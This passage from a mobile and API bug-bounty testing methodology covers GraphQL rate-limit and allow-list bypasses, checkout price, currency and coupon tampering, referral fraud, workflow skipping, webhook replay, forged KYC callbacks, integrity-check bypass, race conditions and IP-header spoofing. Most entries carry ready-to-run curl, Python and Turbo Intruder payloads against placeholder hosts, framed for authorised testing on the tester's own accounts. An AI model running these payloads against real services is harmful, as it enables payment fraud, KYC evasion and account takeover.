- **Ruled out when:** Every sensitive field on every shared type returns `null` with an authorisation error for
  a non-owner, **including through nested paths** — enumerate the paths from the recovered schema rather than
  testing the three the app happens to use.

### D15-073 · GraphQL aliasing and batching to defeat per-request rate limits

| | |
|---|---|
| **Severity ceiling** | Critical (when the aliased field is an OTP or redemption check) |
| **VRT** | `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) as the nearest node; rate the brute force it enables |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | GraphQL endpoints with request-keyed throttling — which is most mobile GraphQL backends |
| **Maps to** | API4:2023 Unrestricted Resource Consumption; PortSwigger GraphQL ("bypassing rate limiting using aliases", batching); H1 #3287208 ($12,500, DoS via mutation aliasing in an account-recovery flow) |

- **Test:** The rate limiter counts HTTP requests, not resolver invocations. Two independent multipliers:
  **aliases** (many invocations of one field in one document) and **batching** (a JSON array of operations in
  one POST). Limiters, logging and WAF rules that inspect a single `query` field see one request.
- **How:**
  ```bash
  python3 - > q.json <<'PY'
  import json
  body = "\n".join(f'a{i}: isValidDiscount(code: "CODE{i:04d}") {{ valid }}' for i in range(500))
  print(json.dumps({"query": "query { " + body + " }"}))
  PY
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $TOKEN" --data-binary @q.json | jq '[.data|to_entries[]|select(.value.valid)]'

  python3 - > batch.json <<'PY'
  import json
  ops = [{"query":'mutation($c:String!){ redeem(code:$c){ ok } }',"variables":{"c":f"CODE{i:04d}"}} for i in range(200)]
  print(json.dumps(ops))
  PY
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $TOKEN" --data-binary @batch.json | jq 'length'
  ```
- **Proof:** One HTTP 200 containing N evaluated results against an endpoint that 429s after n HTTP requests —
  show the limiter firing on the REST equivalent and not firing here, with the rate-limit headers incrementing
  by 1.
- **Escalation:** Combine aliases *with* batching for a multiplicative effect, and check whether the server
  enforces query depth, alias count, operation count or cost limits at all. Aliased OTP verification is the
  Critical shape (→ D13).
- **Ruled out when:** The server rejects documents above an alias/complexity/depth limit, rejects array bodies,
  **and** the limiter decrements per resolver rather than per request — demonstrated by a 429 mid-document.
  Note the FP correction: N successful aliases is a **quota-enforcement** finding, not a race — most reference
  implementations (Apollo, GraphQL-Ruby, Graphene) resolve aliases **sequentially** within one request. Check
  the *server state* afterwards (does the balance actually carry N coupons?) and use D15-085's single-packet
  method if you want to claim a race.

### D15-074 · Persisted-query (APQ) allow-list fallback bypass

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) — the impact is **mutation-surface unlock**, not information leakage |
| **Attacker** | AM-01 / AM-05 |
| **Applies to** | Apollo APQ deployments — **very common in mobile GraphQL clients** |
| **Maps to** | API5:2023; PortSwigger/field methodology `hunt-graphql` "persisted-query fallback bypass" |

- **Test:** An endpoint that claims "persisted queries only" and rejects ad-hoc queries may silently fall back
  to executing the ad-hoc `query` field when the hash is unknown. The allow-list is an **authorisation
  control**; neutralising it makes every mutation official clients cannot invoke reachable.
- **How:**
  ```bash
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' -d '{
    "extensions":{"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000000"}},
    "query":"{ user(id: 1) { email role } }"}'
  # variations: omit sha256Hash; set it null; set the whole extensions object to null;
  # and if you get PersistedQueryNotFound, retry the SAME body unmodified - some fall back on the second attempt
  ```
- **Proof:** The `query` field executing and returning `data` despite the claimed allow-list.
- **Escalation:** → any mutation the allow-list was hiding; combine with D15-008 (the hashes in the APK) to
  show which operations the client is *supposed* to be limited to. If a triager closes it as "debug
  information disclosure", the rebuttal is that the allow-list is an authorisation control and the impact is
  mutation-surface unlock.
- **Ruled out when:** Every variant returns `PersistedQueryNotFound` with no `data`, on the first and repeated
  attempts, and a known-good hash still works (the positive control).

### D15-075 · Operation-shape confusion: side-effecting resolvers under `Query`, and mutations over GET

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for the anonymous side effect; CSRF-to-state-change for the GET variant |
| **Attacker** | AM-01 (Query confusion) / AM-02 (mutation over GET, delivered as a link) |
| **Applies to** | all GraphQL |
| **Maps to** | API5:2023; API8:2023; `hunt-graphql` "operation-type confusion" and "mutation-via-GET" |

- **Test:** Two shapes of the same mistake. (a) Auth middleware guards mutations strictly and treats `query` as
  anonymous-readable — so a side-effecting resolver registered under `Query` runs without auth. (b) Some
  servers treat a `mutation` body identically regardless of HTTP method, so a clickable link performs a state
  change with the victim's cookies.
- **How:**
  ```bash
  # (a) action-shaped names under Query: createUser, sendEmail, resetPassword, transferFunds
  curl -s -X POST https://api.example.com/graphql -H 'Content-Type: application/json' \
    -d '{"query":"{ resetPassword(email:\"you+t@example.com\") { success } }"}'
  # (b) mutation over GET
  curl -s -G https://api.example.com/graphql --data-urlencode \
    'query=mutation{changeEmail(newEmail:"you+attacker@example.com"){ok}}' -b "$VICTIM_COOKIE"
  curl -s https://api.example.com/api/me -b "$VICTIM_COOKIE" | jq .email
  ```
- **Proof:** **The side effect, verified out of band** — the email actually sent to your own inbox, the address
  actually changed on a follow-up read. Many servers parse the mutation at the HTTP layer and reject it at the
  resolver, returning a 200 with `errors` populated: a 200 without side-effect confirmation is not a
  successful mutation.
- **Escalation:** → ATO via email change (→ D13); the GET form is also cacheable and loggable.
- **Ruled out when:** Every action-shaped field lives under `Mutation` and requires auth, and GET requests
  carrying a `mutation` are rejected with `errors` and no state change on the follow-up read.

### D15-076 · Price, amount, total and quantity tampering at checkout

| | |
|---|---|
| **Severity ceiling** | Critical — direct financial loss, repeatable, usually unlimited |
| **VRT** | `decentralized_application_misconfiguration.marketplace_security.price_or_fee_manipulation` (P2) is the closest verified taxonomy node; the VRT has no general business-logic leaf, so carry the rating with CVSS and the money |
| **Attacker** | AM-05 |
| **Applies to** | every app with a checkout, top-up or payout |
| **Maps to** | API3:2023 (the `"total_stay_price"` property-injection scenario); WSTG-BUSL-01 Test Business Logic Data Validation; WSTG-BUSL-03 Test Integrity Checks; ATT&CK T1641.001; Gowthams `price-manipulation.md` / `payment-bypasses.md` |

- **Test:** Whether the server recomputes the payable amount from server-side state (cart id, catalogue price)
  or trusts a client-supplied number. Test every money-adjacent key separately: if `amount` is recomputed but
  `discount` or `creditsToDeduct` is trusted, the same impact arrives through a different key. Then test the
  numeric edge cases, which are a different bug: unbounded quantities produce refunds-on-purchase (negative
  line items), free items (zero-price × rounding) or integer overflow in the total.
- **How:** Place a real **low-value, own** order, then tamper the in-flight request in this order, recording the
  server's decision each time: (1) reduce `amount`; (2) set it to `0`; (3) negative; (4) string `"1"`;
  (5) float with many decimals `0.0000001`; (6) both the tampered and original key (`amount` and `Amount`, or
  duplicate JSON keys).
  ```bash
  curl -s -i -X POST https://api.example.com/v1/orders/place -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' -d '{"cartId":"'"$C"'","amount":1,"currency":"INR"}'
  for q in 0 -1 -1000 2147483647 2147483648 9223372036854775807 1e309 0.5 "1"; do
    printf '%-22s -> ' "$q"
    curl -s -o /tmp/r.json -w '%{http_code}' -X POST https://api.example.com/v1/cart/items \
      -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
      -d "{\"sku\":\"$SKU\",\"quantity\":$q}"; echo " $(jq -r '.total // .error' /tmp/r.json)"
  done
  ```
- **Proof:** The server's **accept/reject decision** and the resulting order record's stored amount, fetched
  back with a separate GET. Screenshot the cart in the app showing the impossible state. **Stop at the
  decision — do not complete a fraudulent payment.**
- **Escalation:** A negative quantity on a *refundable* line item is a money-printing loop: check whether the
  refund path pays out the negative amount. → D23.
- **Ruled out when:** The order record read back carries the server's own price for every money-adjacent key
  and every numeric edge case is rejected or clamped at the **capture** step, not just at the cart step. The FP
  trap is explicit: many cart APIs accept arbitrary client state while payment capture rejects it — *"negative
  price accepted in the cart"* is not a bug, the cart display is fiction.

### D15-077 · Currency confusion and minor-unit mismatch

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `decentralized_application_misconfiguration.marketplace_security.price_or_fee_manipulation` (P2) as the nearest node |
| **Attacker** | AM-05 |
| **Applies to** | multi-currency apps; also single-currency apps that expose the field anyway |
| **Maps to** | WSTG-BUSL-01; API3:2023 |

- **Test:** The server stores price in one currency but accepts a client-supplied `currency`, or assumes a
  minor-unit scale the client can contradict. Add a $100 product and pay `{"amount":100,"currency":"VND"}`
  without changing the *value*.
- **How:**
  ```bash
  for c in USD INR IDR VND JPY XXX ""; do
    printf '%-4s -> ' "${c:-<absent>}"
    curl -s -o /tmp/o -w '%{http_code}\n' -X POST https://api.example.com/v1/orders/place \
      -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
      -d "{\"cartId\":\"$C\",\"amount\":100,\"currency\":\"$c\"}"
  done
  # and the scale question: send 100 where the server expects paise/cents vs rupees/dollars
  ```
- **Proof:** An order created in a currency the account/catalogue does not support, or a charge captured at
  1/100th of the intended value — evidenced by the order record **and** the payment-gateway amount.
- **Escalation:** If refunds are issued in the *original* currency at the *current* rate, the round trip is an
  arbitrage loop. → D23.
- **Ruled out when:** The currency is derived from the catalogue/account and a mismatched value is rejected
  with a distinct error, and the minor-unit scale is fixed server-side (the same numeric value produces the
  same captured amount regardless of what the client claims).

### D15-078 · Coupon and discount abuse: reuse, stacking, scope and late application

| | |
|---|---|
| **Severity ceiling** | Critical (when the credit settles into a withdrawable balance); High otherwise |
| **VRT** | no dedicated VRT leaf — file under business logic and quantify the loss |
| **Attacker** | AM-05 |
| **Applies to** | all commerce apps |
| **Maps to** | WSTG-BUSL-05 Test Number of Times a Function Can Be Used Limits; API6:2023 Unrestricted Access to Sensitive Business Flows; H1 #1849626 ($5,000, fee discount redeemable many times), #759247 (gift cards redeemed multiple times) |

- **Test:** Four distinct behaviours, tested separately: reuse of a single-use code; stacking multiple
  supposedly-exclusive codes; applying a code outside its product/user/region scope; and applying a code
  *after* the order is priced.
- **How:**
  ```bash
  # reuse: redeem, complete the order, redeem again
  # stacking: array form and key-collision form
  -d '{"cartId":"C","coupons":["SAVE50","SAVE50","WELCOME"]}'
  -d '{"cartId":"C","coupon":"SAVE50","couponCode":"WELCOME","promo":"FREESHIP"}'
  -d '{"codes":["SUMMER20","FIRSTORDER","LOYAL10","NEWCUSTOMER","FREESHIP"]}'
  # scope: a merchant-specific code on another merchant's cart; a first-order code on your Nth order
  # late application: PATCH the order after the price is locked
  curl -s -i -X PATCH "https://api.example.com/v1/orders/$O" -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' -d '{"coupon":"SAVE50"}'
  curl -s "https://api.example.com/v1/orders/$O" -H "Authorization: Bearer $TOKEN" | jq '{subtotal,discount,total}'
  ```
- **Proof:** The order total reflecting the discount more than once, or a discount applied outside its stated
  scope, read back from `GET /orders/{id}`. **Verify the discount settles at checkout, not just in the cart
  display** — many systems silently cap the applied discount at 100%: the cart shows `-$50.00` but the captured
  payment is `$0.00` and no refund issues. Free goods is the impact; free goods *plus a refund* is a bigger
  one — document which actually happened.
- **Escalation:** Combine with the race (D15-085) — even a correctly-implemented "once per user" check usually
  has no lock.
- **Ruled out when:** The second redemption is refused with a distinct error, only one code applies per order,
  scope is enforced server-side, and a post-pricing PATCH does not change the captured total — all four checked
  at the **capture** step.

### D15-079 · Referral, invite and signup-bonus fraud

| | |
|---|---|
| **Severity ceiling** | Critical (credits withdrawable to cash); High (spendable only) |
| **VRT** | no dedicated VRT leaf — business logic, quantified |
| **Attacker** | AM-05 |
| **Applies to** | all consumer apps with growth incentives |
| **Maps to** | API6:2023 (its documented scenario is exactly this: "scripts automate user registration repeatedly, accumulating credits in attacker wallets"); WSTG-BUSL-05; WSTG-BUSL-06 Circumvention of Work Flows |

- **Test:** Whether the referral flow can be self-referred, automated or replayed — with tester-owned accounts
  only. The mobile-specific angle is that the only anti-abuse control is usually a **client-generated device
  id**, which is a client-side control.
- **How:**
  ```bash
  # 1. self-referral: register B with A's code from the same device/IP
  # 2. device-signal bypass: reset app state and re-register
  adb shell pm clear com.example.app
  adb shell settings get secure android_id
  # 3. credit timing: is the referrer credited at signup or only after B's first qualifying purchase?
  #    is the credit reversed if B's order is cancelled?
  # 4. replay: submit the same referral code on an already-credited account
  # 5. self-referrer: manipulate referrer_id in your own signup POST
  curl -s -i -X POST https://api.example.com/v1/users -H 'Content-Type: application/json' \
    -d '{"email":"you+r'"$N"'@example.com","password":"…","referrer_id":"'"$MY_OWN_ID"'"}'
  ```
- **Proof:** Account A's credit balance increasing N times from N accounts you created on one device, read back
  from the wallet endpoint, plus the credit surviving cancellation of B's order.
- **Escalation:** Pair with the race (D15-085) to claim one referral N times, and with the OTP-request endpoint
  when the only control is "one account per phone number" (→ D13). Credits withdrawable to cash rather than
  only spendable is the Critical/High fork — state which.
- **Ruled out when:** The referrer is server-derived and immutable, the credit is conditional on a completed
  qualifying purchase and reversed on cancellation, and device/identity signals are server-side (not an
  app-generated id you can rotate with `pm clear`).

### D15-080 · State-machine abuse: skip a step, reorder it, reverse it, or change the cart after pricing

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | no dedicated VRT leaf; `broken_access_control.privilege_escalation` (VARIES) where a stage runs as another principal |
| **Attacker** | AM-05 |
| **Applies to** | all commerce / mobility / ticketing / delivery / enterprise-workflow apps |
| **Maps to** | WSTG-BUSL-06 Testing for the Circumvention of Work Flows; WSTG-BUSL-04 Test for Process Timing; API6:2023; PortSwigger access control — context-dependent controls ("modifying shopping cart contents after payment completion"); H1 #307239 ($10,000, double payout via mishandled provider transaction states), #1295844 ($7,500, modifying in-flight data to a payment provider to generate wallet balance), #1543159 ($5,000, self-approving an admin approval), #894569 ($12,000, running pipeline jobs as an arbitrary user) |

- **Test:** Multi-step flows — `cart → payment → fulfilment`, `KYC → limit raise`, `address verify → delivery`,
  `submit → review → approve` — are frequently enforced only by the client's screen order. Four separate
  attacks: call the terminal step directly; call steps out of order; call a step twice; and modify the object
  *after* the price or approval is locked (the cart-state TOCTOU).
- **How:**
  ```bash
  # enumerate the transitions the client can drive
  grep -rnE '"(status|state)"\s*:|markAs|transitionTo|confirm|complete|cancel|deliver|checkin|fulfil|approve' $S
  # terminal step, on a fresh object that has passed no earlier stage
  curl -s -i -X POST https://api.example.com/v1/kyc/complete -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' -d '{"applicationId":"'"$APP"'"}'
  curl -s -i -X POST "https://api.example.com/v1/orders/$OID/fulfil" -H "Authorization: Bearer $TOKEN"
  # direct status writes and reversals
  curl -s -i -X PATCH "https://api.target/v1/orders/$O" -H "Authorization: Bearer $BUYER" -d '{"status":"fulfilled"}'
  curl -s -i -X PATCH "https://api.target/v1/orders/$O" -H "Authorization: Bearer $BUYER" -d '{"status":"paid"}'
  curl -s -i -X POST  "https://api.target/v1/orders/$O/cancel" -H "Authorization: Bearer $BUYER"   # after fulfilment
  # cart-state TOCTOU: capture the step-1 total on a $1 cart, add expensive items, submit capture against the old total
  ```
  Transition tests worth naming: `pending → shipped` skipping `paid`; `paid → refunded` while goods remain
  delivered; `cancelled → fulfilled`; self-approval in a maker/checker flow; setting the actor or the effective
  date client-side.
- **Proof:** The object reaching the terminal state (`GET /kyc/status` → `APPROVED`, order → `SHIPPED`) without
  the intermediate records existing, or payment captured at $1.00 while the expensive cart ships. Confirm a
  **ledger** effect, not a 200 — show the fulfilment record and the payment ledger disagreeing.
- **Escalation:** A skipped payment step plus a fulfilment trigger is free goods; a skipped KYC step plus a
  raised limit is a money-laundering finding the client will care about disproportionately. Map the full flow
  (initiate → provider redirect → callback → fulfilment) and tamper **each hop** — including replaying a
  previous successful payment-callback webhook against your new order id (D15-081). Approval-stage bypass is
  the **lowest-duplication** logic class because scanners cannot find it.
- **Ruled out when:** Each transition validates the object's current state server-side and rejects out-of-order
  calls with a distinct error, the actor is session-derived, and a post-pricing cart change invalidates the
  captured total — each demonstrated on your own order.

### D15-081 · Replay of state transitions: idempotency keys, duplicate submission and signed webhooks

| | |
|---|---|
| **Severity ceiling** | Critical for money movement; High for entitlement |
| **VRT** | no dedicated VRT leaf; rate with CVSS and the ledger delta |
| **Attacker** | AM-05 (client replay); AM-01 (webhook replay) |
| **Applies to** | all apps with state-changing endpoints; mandatory for fintech |
| **Maps to** | WSTG-BUSL-05; WSTG-BUSL-02 Test Ability to Forge Requests; API6:2023 |

- **Test:** The non-concurrent cousin of the race tests, and it often succeeds where the race does not: can a
  state-changing request simply be re-sent? Three variants — replay with the idempotency key held constant,
  replay with the key removed, and replay of a **signature-verified webhook** the app never checks for
  duplicate event ids.
- **How:**
  ```bash
  for i in 1 2 3; do
    curl -s -o /tmp/r$i.json -w '%{http_code} ' -X POST https://api.example.com/v1/wallet/transfer \
      -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
      -d '{"to":"'"$MY_SECOND_ACCOUNT"'","amount":1,"idempotencyKey":"fixed-key-123"}'
  done; echo
  # repeat with the key removed, and with a fresh key each time
  # and with the SAME key but a DIFFERENT body (a correct implementation rejects; some process the second body)
  # webhook: re-deliver a captured, still-validly-signed "payment received" event
  curl -s -i -X POST https://api.example.com/v1/webhooks/psp -H "Stripe-Signature: $CAPTURED_SIG" \
    --data-binary @captured_event.json
  ```
- **Proof:** The ledger showing N transfers from one captured request with the idempotency key held constant —
  that combination proves the key is decorative. For the webhook, the order credited twice / the refund
  processed twice / metered usage doubled.
- **Escalation:** If replay works, the race almost certainly works too and at higher volume (D15-085) — test
  both and report the stronger one. → D23.
- **Ruled out when:** The second identical request returns the *first* result without a second ledger entry
  (true idempotency), the same key with a different body is rejected, and the webhook handler refuses a
  duplicate event id — all three, read from the ledger rather than from status codes.

### D15-082 · KYC / verification status and OCR fields asserted by the client

| | |
|---|---|
| **Severity ceiling** | Critical — it defeats the AML/KYC control the product is legally required to run |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) as the nearest node for the control bypass; quantify the limit delta |
| **Attacker** | AM-05 |
| **Applies to** | all regulated apps with in-app identity verification |
| **Maps to** | API6:2023; WSTG-BUSL-06 (no external identifier verified in the corpus for this specific surface) |

- **Test:** Vendor SDKs return a completion callback to the app; weak integrations then tell the *backend*
  "KYC complete" instead of the backend fetching the result from the vendor. Likewise, OCR'd name/DOB/ID
  number are often posted by the client and used for the sanction or age check.
- **How:**
  ```bash
  grep -rnE 'onComplete|onSuccess|SdkResult|applicantId|inquiryId|checkId|verificationStatus|kycStatus|setKycVerified|extracted(Name|Dob|IdNumber)' $S
  curl -s -i -X POST https://api.target/v1/kyc/callback -H "Authorization: Bearer $A" \
    -H 'Content-Type: application/json' \
    -d '{"status":"approved","applicant_id":"'"$MINE"'","name":"…","dob":"1990-01-01"}'
  curl -s https://api.target/v1/me -H "Authorization: Bearer $A" | jq '.kyc_status,.limits'
  ```
- **Proof:** `/me` flipping to `kyc_status: approved` and the transaction/withdrawal limits rising **without
  the vendor ever running a check** — confirm by never launching the SDK at all, or by showing the vendor
  dashboard has no corresponding completed check.
- **Escalation:** Approved KYC typically raises transfer/withdrawal ceilings — quantify the limit delta in the
  report; it is what makes the finding legible to the client's risk team. → D18 for the vendor-SDK token.
- **Ruled out when:** The backend fetches the verdict from the vendor by applicant id over a server-to-server
  channel and ignores any client-asserted status, demonstrated by the status remaining `pending` after your
  forged callback.

### D15-083 · Enforced-update bypass (client-side version gating)

| | |
|---|---|
| **Severity ceiling** | High (when the enforced update is the mitigation for a known client-side vulnerability — you are re-enabling a patched bug); Medium otherwise |
| **VRT** | `broken_access_control.privilege_escalation` (VARIES) as the nearest node |
| **Attacker** | AM-05 / AM-12 |
| **Applies to** | apps using Google Play In-App Updates or a backend `minVersion` gate |
| **Maps to** | MASTG-TEST-0392 (References to Enforced Updating APIs), MASTG-TEST-0382 (Runtime Use of Enforced Updating APIs — explicitly instructs "lowering the reported version value in network requests, for example `version`, `versionCode`, or `build` using an interception proxy"), MASWE-0043, MASTG-KNOW-0023, MASVS-CODE-2 |

- **Test:** An app that gates access on a minimum version is enforcing a business-logic control in the client.
  MASTG gives the bypass checklist: dismiss the dialog, cancel an immediate update flow, background the app
  mid-update, or tamper with the reported version.
- **How:**
  ```bash
  grep -rn 'AppUpdateManagerFactory\|getAppUpdateInfo\|startUpdateFlowForResult\|AppUpdateType.IMMEDIATE\|UpdateAvailability\|DEVELOPER_TRIGGERED_UPDATE_IN_PROGRESS' $S
  grep -rn 'BuildConfig.VERSION_NAME\|BuildConfig.VERSION_CODE\|getPackageInfo\|minVersion' $S
  ```
  Then raise the `version`/`versionCode`/`build` value the client sends in the proxy and watch the gate
  response; and in the UI, cancel or background the immediate update flow and see whether access is restored.
- **Proof:** Access to protected functionality after cancelling the mandatory update, or after rewriting the
  version field in the request.
- **Escalation:** Downgrade-gate bypass lets you run an outdated client against the current API — which is also
  the delivery vehicle for D15-014 (legacy backend routing) and for re-enabling any client bug the update was
  meant to close.
- **Ruled out when:** The server rejects requests from a version below the floor regardless of the client-sent
  value (i.e. the floor is enforced on a server-derived signal such as the signed Play Integrity
  `versionCode`), and cancelling the update flow leaves the app non-functional.

### D15-084 · Client-computed integrity claims the server does not verify

| | |
|---|---|
| **Severity ceiling** | High — the entire anti-abuse posture is decorative, and it invalidates the vendor's "root detection prevents this" rebuttal to your other findings |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) when the claim is the only gate; otherwise rate what it re-opens |
| **Attacker** | AM-05 / AM-12 |
| **Applies to** | all apps sending a signature, device id, integrity verdict or "rooted:false" claim |
| **Maps to** | MASWE-0062 (No Application-Level Payload Encryption — a MAS-R resilience control; its converse is that the layer, once bypassed, provides no authorisation); MASTG-TECH-0043; MASVS-RESILIENCE-3; ATT&CK T1633.001 System Checks, T1630.003 Disguise Root/Jailbreak Indicators, mitigation M1002 Attestation; Google Play Integrity documentation (`requestDetails`, `appIntegrity.appRecognitionVerdict == PLAY_RECOGNIZED`, `accountDetails.appLicensingVerdict == LICENSED`, `deviceIntegrity`, `requestHash` for standard requests / `nonce` for classic, "No caching: request verdicts on-demand to prevent replay/proxying attacks", and the note that `requestPackageName` can be spoofed in the middle of the request) |

- **Test:** Four claims the client makes and the server usually fails to verify, tested as one battery.
  (a) **A request signature or app-layer encryption** — recover the key (D12) or hook the crypto boundary, then
  tamper the plaintext freely. (b) **A device id used as authorisation** (`ANDROID_ID`, FCM token, advertising
  id, an install UUID) — replay another install's identifier. (c) **A Play Integrity verdict** — replay it,
  strip it, or check whether `requestHash`/`nonce` is bound to the request body at all. (d) **A dead
  control**: SafetyNet Attestation was fully turned down in **January 2025** and now always invokes the failure
  listener with status code 7 (`NETWORK_ERROR`), so an app that treats failure as "network problem, allow" has
  a permanently open gate.
- **How:**
  ```bash
  grep -rnE 'IntegrityManager|StandardIntegrityManager|requestIntegrityToken|integrityToken|setNonce\(|setRequestHash\(' $S
  grep -rn 'SafetyNet\|SafetyNetClient\|attest(' $S -A8 | grep -in 'addOnFailureListener\|catch\|allow'
  unzip -l base.apk | grep -i safetynet
  grep -RnE 'Settings\.Secure\.ANDROID_ID|getAndroidId|FirebaseInstanceId|getToken\(|AdvertisingIdClient|X-Device|X-Api-Key' $S
  ```
  Then, at the API: remove the header entirely; replay a valid verdict from a clean device on a rooted one;
  send an obviously invalid verdict; and capture two requests with **different bodies** and compare their
  `requestHash` — if identical, content binding is absent and you can relay a clean-device token alongside a
  modified request.
  ```javascript
  // recover the plaintext under app-layer encryption, then tamper and re-encrypt
  // hook javax.crypto.Cipher.doFinal(byte[]) on both paths and log with backtraces
  ```
- **Proof:** A 200 with the attestation header removed, or the same integrity token accepted twice for
  different operations, or the server accepting device A's token with device B's request body, or a modified
  plaintext (changed amount, changed object id) re-encrypted and accepted. A privileged API response returned
  to plain `curl` from a host that never ran the app is the cleanest form.
- **Escalation:** With attestation bypassed, every "requires a modified client" caveat disappears from your
  other findings — restate their severity accordingly. Be explicit in the report that "no application-layer
  encryption" is a MAS-R hardening item and **Informational** on most programs; the finding is what you do once
  inside it. Beware the opposite leak: data in `nonce`/`requestHash` is "visible in cleartext to your app and
  Google", so a nonce carrying an email or a bearer token is its own disclosure (→ D20).
- **Ruled out when:** The server rejects requests with the verdict absent, replayed or content-mismatched;
  `requestHash` changes with the body; the four documented baseline checks are all performed server-side; the
  signature key is server-issued and non-exportable; and no SafetyNet dependency ships. Anything less, name
  which check is missing.

### D15-085 · Race conditions: limit overrun, multi-endpoint collision, and the sequential baseline that must precede both

| | |
|---|---|
| **Severity ceiling** | Critical for money/credit; High for entitlement |
| **VRT** | `server_security_misconfiguration.race_condition` (VARIES) |
| **Attacker** | AM-05 |
| **Applies to** | all stateful backends; highest yield on account-settings and order-state machines |
| **Maps to** | PortSwigger "Smashing the state machine" (limit-overrun, multi-endpoint collisions, single-endpoint collisions, sub-states, the single-packet attack); WSTG-BUSL-05; API6:2023; H1 #300305 ($15,250, email-verification bypass enabling takeover), #2110030 ($3,000), #759247, #429026, #1438052 ($5,000), #1520931 ($4,000), #2078571 ($2,480), #119657 ($2,000), #486629 (unlocking a loyalty benefit multiple times in one day) |

- **Test:** Check-then-act flows read state, validate, then mutate, with a window between read and write. Three
  shapes: **limit overrun** (one single-use code, one-per-account bonus, a withdrawal against a balance);
  **multi-endpoint collisions** (two *different* endpoints writing the same object concurrently — the canonical
  pattern is change-email + confirm-email at the same instant, which sends the verification message to one
  address carrying a token for another); and **single-endpoint sub-states** (one complex request passing
  through fleeting hidden states).
- **How:** **Run the sequential baseline first** — 10–30 requests one after another. If they all succeed it is
  a logic bug (D15-081), not a race, and it belongs in a different section with different defences (atomic
  transactions, unique constraints, advisory locks). Races reproduce 1/10 or 2/100; logic bugs reproduce 1/1.
  ```python
  # Turbo Intruder gate
  def queueRequests(target, wordlists):
      engine = RequestEngine(endpoint=target.endpoint,
                             concurrentConnections=30,
                             requestsPerConnection=10,
                             pipeline=False)
      for i in range(30):
          engine.queue(target.req, str(i), gate='race1')
      engine.openGate('race1')
      engine.complete(timeout=60)

  def handleResponse(req, interesting):
      table.add(req)
  ```
  ```bash
  # or Burp Repeater "send group in parallel" (HTTP/2 single-packet: 20-30 requests in one TCP packet,
  # median spread ~4 ms -> ~1 ms). Crude but often sufficient:
  seq 1 30 | xargs -P 30 -I{} curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    -H "Authorization: Bearer $A" -H 'Content-Type: application/json' \
    -d '{"coupon":"SAVE50"}' https://api.target.tld/v1/redeem | sort | uniq -c
  ```
  For multi-endpoint collisions, put the two requests in one Burp tab group and send in parallel 20–30 times,
  watching for **second-order** effects (an email arriving at the wrong address).
- **Proof:** A **ledger** effect — balance, count, membership — not N×200. State the balance before and after,
  and show the sequential baseline allowing 1. For the collision, the second-order artefact: an email or SMS
  delivered to address X containing a token for address Y, or an object in a state neither request alone can
  produce. Screenshot the inbox.
- **Escalation:** Applies to *any* "you may do this once" control, including MFA enrolment and OTP validation
  (→ D13). Mobile-specific targets the web app does not expose: in-app top-up, referral credit, daily-reward
  claim, scratch-card reveal, loyalty-point burn. CVSS for this class runs `AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N`
  — note the `AC:H`.
- **Ruled out when:** 30 parallel single-packet attempts yield exactly one success and the ledger shows one
  effect, repeated three times, **and** the sequential baseline also yields one. Deferred races are the trap:
  some only fire when a background batch job runs, so retry with 20+ minute gaps before concluding the endpoint
  is safe. Do this against your own balance only, and restore and report the state you created.

### D15-086 · Measure the rate limit on every mobile-only endpoint, then work out what it keys on

| | |
|---|---|
| **Severity ceiling** | High (credential stuffing / OTP brute force); Medium for enumeration-only endpoints |
| **VRT** | `server_security_misconfiguration.no_rate_limiting_on_form.login` / `.registration` / `.change_password` (P4/P5); `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) where you can show billing impact |
| **Attacker** | AM-01 |
| **Applies to** | all. **The clearest example of "mobile-only endpoints the web app does not expose"** |
| **Maps to** | API4:2023 Unrestricted Resource Consumption; NIST SP 800-63B §5.2.2 (verifiers **shall** limit consecutive failed attempts on a single account to no more than 100); Mobile Top 10 2024 M8; ATT&CK T1636.004 |

- **Test:** The web login has CAPTCHA, device fingerprinting and WAF rules. The mobile token endpoint often has
  none, because it was built for a "trusted" client. Measure the limit independently on login/ROPC, OTP send,
  OTP verify, password reset, email/phone lookup, referral-code validation, coupon validation, media upload and
  sync. Then determine what the limiter keys on and vary that key — mobile APIs frequently key on a
  client-supplied header.
- **How:**
  ```bash
  ENDPOINT=https://api.example.com/v1/auth/login
  for i in $(seq 1 120); do
    printf '%s ' "$(curl -s -o /dev/null -w '%{http_code}' -X POST $ENDPOINT \
      -H 'Content-Type: application/json' -d '{"username":"me@example.com","password":"wrong'"$i"'"}')"
  done; echo
  # after a 429, retry varying one key at a time
  for h in "X-Forwarded-For: 1.2.3.4" "X-Real-IP: 1.2.3.4" "X-Originating-IP: 1.2.3.4" "X-Client-IP: 1.2.3.4" \
           "X-Remote-IP: 1.2.3.4" "X-Remote-Addr: 1.2.3.4" "True-Client-IP: 1.2.3.4" "X-Device-Id: $(uuidgen)"; do
    printf '%-34s -> ' "$h"
    curl -s -o /dev/null -w '%{http_code}\n' -X POST $ENDPOINT -H "$h" \
      -H 'Content-Type: application/json' -d '{"username":"me@example.com","password":"x"}'
  done
  # and identifier-format variants: ME@example.com / me+1@example.com / "me@example.com " / me@example.com%00
  ```
  Also check anti-automation and lockout as their own questions: 100 OTP sends to your own number (each is a
  billed SMS — attacker-controlled cost to the vendor), and 20 failed logins against a **second account you
